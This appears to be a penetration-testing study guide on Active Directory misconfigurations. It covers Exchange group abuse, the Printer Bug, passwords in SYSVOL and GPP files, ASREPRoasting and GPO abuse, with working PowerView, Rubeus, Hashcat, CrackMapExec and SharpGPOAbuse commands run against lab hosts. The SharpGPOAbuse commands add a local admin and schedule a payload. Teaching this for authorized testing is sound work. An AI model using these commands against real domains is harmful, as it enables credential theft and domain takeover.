# Miscellaneous Misconfigurations

AD environments accumulate misconfigurations over time through legacy installations, vendor defaults, and administrative shortcuts. This section covers a broad set of issues that individually may seem minor but often chain together to give an attacker a clear path to domain compromise.

***

## Exchange-Related Risks

A default Exchange installation grants the `Exchange Windows Permissions` group the ability to write a DACL to the domain object. Any member can be granted DCSync privileges from this position. The group is not protected by AdminSDHolder, so its ACEs can be modified. Members of `Account Operators` can add users to this group, which makes it a common escalation target. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

The `Organization Management` group is even more powerful, effectively acting as "Domain Admins" for Exchange. It has full control over the `Microsoft Exchange Security Groups` OU and can access every mailbox in the domain. Compromising an Exchange server frequently yields large volumes of cleartext credentials or NTLM hashes from memory, since Outlook Web Access (OWA) caches credentials after login. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### PrivExchange

The PrivExchange attack abuses the Exchange PushSubscription feature to force the Exchange server (running as SYSTEM with WriteDacl on the domain pre-2019 CU) to authenticate to an attacker-controlled host. This authentication can be relayed to LDAP and used to dump the NTDS database, requiring only any authenticated domain user account. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Printer Bug (MS-RPRN)

Any domain user can connect to the Print Spooler named pipe and force a server to authenticate over SMB to an attacker-controlled host via `RpcRemoteFindFirstPrinterChangeNotificationEx`. Since the spooler runs as SYSTEM, the authentication can be relayed to LDAP to grant DCSync rights, or used to set up Resource-Based Constrained Delegation (RBCD) to compromise a host. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

Check if a host is vulnerable:

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Output `Status: True` means the spooler is running and the host is vulnerable. This technique also works cross-forest if unconstrained delegation is enabled on the target, making it useful for attacking forest trusts from a compromised domain. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Password Exposure Misconfigurations

### Passwords in User Description Fields

Passwords stored in the `Description` or `Notes` fields of AD user accounts are a surprisingly common finding. They are readable by any authenticated domain user:

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

Example output:

```
samaccountname   description
--------------   -----------
ldap.agent       *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

### PASSWD_NOTREQD Flag

Accounts with `PASSWD_NOTREQD` set in `userAccountControl` may have no password or a password shorter than the domain policy requires. This is often set by vendor products at install time and never cleaned up:

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Each account found should be tested to confirm whether authentication succeeds with a blank password. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### SYSVOL Scripts

The SYSVOL share is readable by all authenticated users. Scripts stored in the `\scripts` directory frequently contain hardcoded credentials. A VBScript storing a local admin password looks like:

```vbscript
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
```

Once a password is found here, test it across all domain hosts with CrackMapExec using `--local-auth` to identify where it is still valid. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## GPP Passwords

Group Policy Preferences XML files stored in SYSVOL contain a `cpassword` attribute encrypted with AES-256. Microsoft published the private key on MSDN, making the encryption trivially reversible. The MS14-025 patch prevented new GPP passwords from being created but did not remove existing ones. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

Decrypt a `cpassword` value manually:

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
# Output: Password1
```

Find and retrieve GPP passwords automatically with CrackMapExec:

```bash
crackmapexec smb -L | grep gpp
# gpp_password   - Retrieves plaintext password from GPP
# gpp_autologin  - Searches for autologon credentials in Registry.xml
```

Hunt for autologon credentials:

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

Example output:

```
Usernames: ['guarddesk']
Passwords: ['ILFreightguardadmin!']
```

GPP passwords are frequently for legacy or disabled accounts, but always attempt password spraying internally since reuse is common. `Registry.xml` autologon credentials have never been patched and are returned in cleartext to any authenticated domain user. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## ASREPRoasting

Accounts with `Do not require Kerberos pre-authentication` set (`DONT_REQ_PREAUTH`) can have their AS-REP ticket retrieved without knowing their password. The AS-REP is encrypted with the account's password and can be cracked offline. No SPN is required, unlike Kerberoasting. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

Enumerate vulnerable accounts with PowerView:

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

Request the AS-REP hash using Rubeus:

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

Crack offline with Hashcat mode `18200`:

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
# Cracked: Welcome!00
```

From Linux, use Impacket's `GetNPUsers.py` against a list of known valid users:

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

[Kerbrute](https://github.com/ropnop/kerbrute) will automatically dump AS-REPs during user enumeration for any accounts found without pre-authentication required, meaning you can discover users and retrieve crackable hashes in one pass. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

If you have `GenericWrite` or `GenericAll` over an account, you can enable `DONT_REQ_PREAUTH`, retrieve the AS-REP, crack the password, then disable the setting again. Report this even if the hash cannot be cracked, as the misconfiguration itself is a finding. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## GPO Abuse

GPO misconfigurations are among the most impactful findings in a locked-down environment because changes push down to every user and computer in affected OUs automatically. Common abuse paths include:

- Adding `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, or `SeImpersonatePrivilege` to a user
- Adding a local admin user to one or more hosts
- Creating a scheduled task that executes a reverse shell or payload
- Configuring a malicious computer startup script

Enumerate GPO names and check ACLs for your controlled user or group:

```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Convert a GPO GUID to a readable name:

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
# DisplayName: Disconnect Idle RDP
```

Finding `WriteProperty` or `WriteDacl` on a GPO means you can take full control of it. Use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to weaponize this:

```powershell
# Add a local admin to affected hosts
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Disconnect Idle RDP"

# Create an immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author INLANEFREIGHT\Administrator --Command "cmd.exe" --Arguments "/c <payload>" --GPOName "Disconnect Idle RDP"
```

Check BloodHound's `Node Info > Affected Objects` tab on any GPO to see exactly which OUs and computer objects will be impacted before executing. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## DNS Enumeration with adidnsdump

All authenticated domain users can list child objects of DNS zones in AD by default. Standard DNS queries return incomplete results, but [adidnsdump](https://github.com/dirkjanm/adidnsdump) uses LDAP to retrieve every DNS record in the zone, surfacing hosts that do not appear in standard tooling:

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
# Outputs records.csv
```

Some records return blank values. Use `-r` to resolve them via A record queries:

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

A blank entry like `?,LOGISTICS,?` resolves to `A,LOGISTICS,172.16.5.240`, revealing a host that would otherwise be invisible during enumeration. In large environments with non-descriptive hostnames, this can uncover interesting targets like Jenkins servers, backup hosts, or legacy systems. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)
